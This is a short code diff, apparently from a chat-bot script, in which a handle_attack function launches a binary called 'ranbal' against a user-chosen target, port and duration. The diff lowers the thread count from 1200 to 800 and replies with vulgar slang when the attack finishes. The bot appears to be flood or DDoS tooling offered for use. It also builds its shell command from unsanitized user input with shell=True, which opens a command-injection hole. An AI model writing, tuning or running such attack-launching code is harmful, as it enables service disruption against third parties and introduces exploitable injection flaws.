@@ -301,7 +301,7 @@ def handle_attack(message):
                     start_attack_reply(message, target, port, time)
 
                     # Simulate attack process
-                    full_command = f"./ranbal {target} {port} {time} 1200"
+                    full_command = f"./ranbal {target} {port} {time} 800"
                     subprocess.run(full_command, shell=True)
 
                     response = "Chudai completed successfully."
